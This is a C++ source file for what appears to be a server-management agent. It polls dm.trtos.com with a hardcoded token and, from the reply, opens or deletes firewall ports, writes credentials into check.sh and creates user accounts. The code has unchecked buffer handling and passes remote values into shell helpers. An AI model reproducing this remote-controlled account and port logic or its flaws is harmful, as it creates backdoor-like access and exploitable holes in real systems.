#include <iostream>
#include <string>
#include <vector>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h> 
#include "square.h"
#include "appconfig.h"
#include "shell.h"
#include "ini.h"
#include "log.h"
#include "spdlog/spdlog.h"
#include "spdlog/sinks/basic_file_sink.h"

using namespace std;

#define DEST_PORT 80
#define DEST_IP_BY_NAME "dm.trtos.com"
#define GET_KEY "POST http://dm.trtos.com/php/value.php?name=servertool_key HTTP/1.1\r\n"
#define SET_KEY "POST http://dm.trtos.com/php/value.php?name=servertool_key&value=454545 HTTP/1.1\r\n";
#define SET_MAC "POST http://dm.trtos.com/php/value.php?name=servertool_mac&value=55:34:33:33:33 HTTP/1.1\r\n";


string http_get(int fd,string text) {
int send_num;
    char send_buf [] = "helloworld";
    char recv_buf [4096];
    char str1[4096];
    string res;
    while (1) {
        spdlog::info("begin send\n");
        memset(str1,0,4096);
        strcat(str1, text.c_str());
        strcat(str1,"Host: dm.trtos.com\r\n");
        strcat(str1,"Content-Length: 65\r\n");
        strcat(str1,"Content-Type: application/x-www-form-urlencoded\r\n");
        strcat(str1,"\r\n");
        strcat(str1,"mathod=adb_signe&token=0E1FEECD0EE54E3B8568A536A7036D78B1AC7EEE");
        strcat(str1,"\r\n\r\n");
        I("str1 = {}\n",str1);
        send_num = send(fd, str1,strlen(str1),0);
        if (send_num < 0) {
            spdlog::error("send error");
            exit(1);
        } else {
            I("{}:send successful\n",__FILE__);
            I("begin recv:\n");
            int recv_num = recv(fd,recv_buf,sizeof(recv_buf),0);
            if(recv_num < 0) {
                E("recv fail!");
                exit(1);
            } else {
                I("recv sucess:{}\n",recv_buf);
                res=recv_buf;
            }
        }
        break;
        sleep(5);
    }
    close(fd);
    return res;
}

int connect_ip(string ip)
{
    int sock_fd;
    struct sockaddr_in addr_serv;
    sock_fd=socket(AF_INET, SOCK_STREAM, 0);
    if (sock_fd < 0)
    {
       E("sock error");
       exit(1);
    }
    memset(&addr_serv, 0, sizeof(addr_serv));
    addr_serv.sin_family = AF_INET;
    addr_serv.sin_port = htons(DEST_PORT);
    I("Ip address={}",ip.c_str());
    in_addr_t addr=inet_addr(ip.c_str());
    memcpy(&addr_serv.sin_addr, &(addr), sizeof(addr));
    if (connect(sock_fd, (struct sockaddr*)(&addr_serv), sizeof(addr_serv)) < 0)
    {
        E("connect error\n");
        return -1;
    }
    return sock_fd;
}
string http_getkey(string get)
{
    int fd=connect_ip(ap_serverip);
    if(fd==-1)return "";
    string str=http_get(fd,get);
    I("start={},end={}\r\n",(int)str.find("["),(int)str.find("]"));
    str = str.substr(str.find("[")+1 ,str.find("]")-str.find("[")-1);
    return str;
}
void http_sendmac()
{
    char str1[512];
    int fd=connect_ip(ap_serverip);
    if(fd==-1)return;
    memset(str1,0,512);
    strcat(str1, "POST http://dm.trtos.com/php/value.php?name=servertool_mac&value=");
    strcat(str1, ap_mac.c_str());
    strcat(str1, " HTTP/1.1\r\n");
    string r=http_getkey(str1);
    if(ap_debug)std::cout <<r << std::endl;
}
void http_thread()
{
    string r=http_getkey(GET_KEY);
    I("KEY:{}",r);
    r=encryption(r);
    W("strcmp={}",strcmp(r.c_str(),ap_key.c_str()));
    if(strcmp(r.c_str(),ap_key.c_str())!=0)
    {
        printf("REVICE kEY:%s\r\n",r.c_str());
        I("CONTEXT:{}",r);
        string po1=get_url_value(r,"po1");
        string po2=get_url_value(r,"po2");
        string po3=get_url_value(r,"po3");
        string data=get_url_value(r,"data");
        string un=get_url_value(r,"un");
        string pw=get_url_value(r,"pw");
        string path=get_url_value(r,"path");
        string pf1=get_url_value(r,"pf1");
        string pf2=get_url_value(r,"pf2");
        string pf3=get_url_value(r,"pf3");
        string allp=po1+" "+po2+" "+po3;
        cout<<"allp"<<(allp)<<endl;
        allowport(allp);//允许端口
        string delp=pf1+" "+pf2+" "+pf3;//这次关闭的端口
        if(data.size()>1)set_key_value("check.sh","data",data.c_str());
        if(un.size()>1)set_key_value("check.sh","un",un.c_str());
        if(pw.size()>1)set_key_value("check.sh","pw",pw.c_str());
        if(path.size()>1)set_key_value("check.sh","path",path.c_str());
        if(data.size()>1)
        {
            string res=write_shell(allp);//计划任务删除端口
            I(res);
        }
        if(delp.size()>1)
        {
             string res=deleteport(delp);//删除端口操作
             I(res);
        }
        if(un.size()>1)
        {
            string res=createuser(un);//创建用户
            I(res);
        }
        ap_key=r;
    }
}
